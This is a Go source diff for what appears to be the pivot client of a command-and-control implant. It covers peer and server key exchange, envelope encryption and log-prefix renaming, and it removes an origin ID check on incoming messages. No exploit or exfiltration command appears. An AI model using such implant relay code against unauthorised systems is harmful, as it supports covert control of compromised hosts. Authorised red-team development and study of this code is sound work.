@@ -33,8 +33,12 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
-// OriginID - Random origin identifier
-func OriginID() int64 {
+var (
+	OriginID = originID() // The origin's PeerID
+)
+
+// originID - Random origin identifier
+func originID() int64 {
 	buf := make([]byte, 8)
 	rand.Read(buf)
 	return int64(binary.LittleEndian.Uint64(buf))
@@ -59,10 +63,16 @@ func (p *NetConnPivotClient) KeyExchange() error {
 	if err != nil {
 		return err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[pivot] Peer key exchange successful")
+	// {{end}}
 	err = p.serverKeyExchange()
 	if err != nil {
 		return err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[pivot] Server key exchange successful")
+	// {{end}}
 	return nil
 }
 
@@ -70,7 +80,7 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 	publicKey, err := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error decoding public key: %v", err)
+		log.Printf("[pivot] Error decoding public key: %v", err)
 		// {{end}}
 		return err
 	}
@@ -89,7 +99,7 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 	p.conn.SetReadDeadline(time.Time{})
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error reading peer public key: %v", err)
+		log.Printf("[pivot] Error reading peer public key: %v", err)
 		// {{end}}
 		return err
 	}
@@ -97,14 +107,14 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 	err = proto.Unmarshal(peerPublicKeyRaw, peerHello)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error un-marshaling peer public key: %v", err)
+		log.Printf("[pivot] Error un-marshaling peer public key: %v", err)
 		// {{end}}
 		return err
 	}
 	peerSessionKey, err := cryptography.ECCDecryptFromPeer(peerHello.PublicKey, peerHello.PublicKeySignature, peerHello.SessionKey)
 	if err != nil || len(peerSessionKey) != 32 {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error decrypting session key: %v", err)
+		log.Printf("[pivot] Error decrypting session key: %v", err)
 		// {{end}}
 		return err
 	}
@@ -115,7 +125,7 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 }
 
 func (p *NetConnPivotClient) serverKeyExchange() error {
-	p.originID = OriginID()
+	p.originID = OriginID
 	serverSessionKey := cryptography.RandomKey()
 	p.serverCipherCtx = cryptography.NewCipherContext(serverSessionKey)
 	ciphertext, err := cryptography.ECCEncryptToServer(serverSessionKey[:])
@@ -135,7 +145,7 @@ func (p *NetConnPivotClient) serverKeyExchange() error {
 		return err
 	}
 	// {{if .Config.Debug}}
-	log.Printf("[tcppivot] Sending server key exchange ...")
+	log.Printf("[pivot] Sending server key exchange ...")
 	// {{end}}
 	p.conn.SetWriteDeadline(time.Now().Add(p.writeDeadline))
 	err = p.write(keyExchangeCiphertext)
@@ -145,7 +155,7 @@ func (p *NetConnPivotClient) serverKeyExchange() error {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[tcppivot] Waiting for server key exchange response (5m) ...")
+	log.Printf("[pivot] Waiting for server key exchange response (5m) ...")
 	// {{end}}
 	// Now that both peer/server cipher contexts are setup we can use ReadEnvelope() we use
 	// a different read deadline here as this has to go round trip to the server if the
@@ -169,13 +179,13 @@ func (p *NetConnPivotClient) write(message []byte) error {
 	n, err := p.conn.Write(p.lengthOf(message))
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error writing message length: %v", err)
+		log.Printf("[pivot] Error writing message length: %v", err)
 		// {{end}}
 		return err
 	}
 	if n != 4 {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error writing message length: %v", err)
+		log.Printf("[pivot] Error writing message length: %v", err)
 		// {{end}}
 		return ErrFailedWrite
 	}
@@ -186,7 +196,7 @@ func (p *NetConnPivotClient) write(message []byte) error {
 		total += n
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[tcppivot] Error writing message: %v", err)
+			log.Printf("[pivot] Error writing message: %v", err)
 			// {{end}}
 			return err
 		}
@@ -201,7 +211,7 @@ func (p *NetConnPivotClient) read() ([]byte, error) {
 	n, err := p.conn.Read(dataLengthBuf)
 	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
+		log.Printf("[pivot] Error (read msg-length): %v\n", err)
 		// {{end}}
 		return nil, err
 	}
@@ -238,25 +248,25 @@ func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 	plaintext, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Marshaling error: %s", err)
+		log.Printf("[pivot] Marshaling error: %s", err)
 		// {{end}}
 		return err
 	}
 	ciphertext, err := p.serverCipherCtx.Encrypt(plaintext)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Server encryption error: %s", err)
+		log.Printf("[pivot] Server encryption error: %s", err)
 		// {{end}}
 		return err
 	}
-	originEnvelope, _ := proto.Marshal(&pb.Envelope{
-		ID:   p.originID,
+	peerEnvelope, _ := proto.Marshal(&pb.Envelope{
+		Type: pb.MsgPivotOriginEnvelope,
 		Data: ciphertext,
 	})
-	peerCiphertext, err := p.peerCipherCtx.Encrypt(originEnvelope)
+	peerCiphertext, err := p.peerCipherCtx.Encrypt(peerEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Peer encryption error: %s", err)
+		log.Printf("[pivot] Peer encryption error: %s", err)
 		// {{end}}
 		return err
 	}
@@ -268,38 +278,39 @@ func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 	data, err := p.read()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error reading message: %v", err)
+		log.Printf("[pivot] Error reading message: %v", err)
 		// {{end}}
 		return nil, err
 	}
 	data, err = p.peerCipherCtx.Decrypt(data)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Peer decryption error: %s", err)
+		log.Printf("[pivot] Peer decryption error: %s", err)
 		// {{end}}
 		return nil, err
 	}
-	outerEnvelope := &pb.Envelope{}
-	err = proto.Unmarshal(data, outerEnvelope)
+	peerEnvelope := &pb.Envelope{}
+	err = proto.Unmarshal(data, peerEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error unmarshal origin envelope: %v", err)
+		log.Printf("[pivot] Error unmarshal origin envelope: %v", err)
 		// {{end}}
 		return nil, err
 	}
-	if outerEnvelope.Type == pb.MsgPivotPing {
-		return outerEnvelope, nil
+	// The only msg type that isn't encrypted by the server should be pivot pings
+	if peerEnvelope.Type == pb.MsgPivotPing {
+		return peerEnvelope, nil
 	}
-	if outerEnvelope.Type != pb.MsgPivotOriginEnvelope || outerEnvelope.ID != p.originID {
+	if peerEnvelope.Type != pb.MsgPivotOriginEnvelope {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error unexpected envelope type (non-origin)")
+		log.Printf("[pivot] Error unexpected envelope type (non-origin)")
 		// {{end}}
 		return nil, err
 	}
-	plaintext, err := p.serverCipherCtx.Decrypt(outerEnvelope.Data)
+	plaintext, err := p.serverCipherCtx.Decrypt(peerEnvelope.Data)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Server decryption error: %s", err)
+		log.Printf("[pivot] Server decryption error: %s", err)
 		// {{end}}
 		return nil, err
 	}
@@ -307,7 +318,7 @@ func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 	err = proto.Unmarshal(plaintext, envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[tcppivot] Error unmarshal envelope: %v", err)
+		log.Printf("[pivot] Error unmarshal envelope: %v", err)
 		// {{end}}
 		return nil, err
 	}
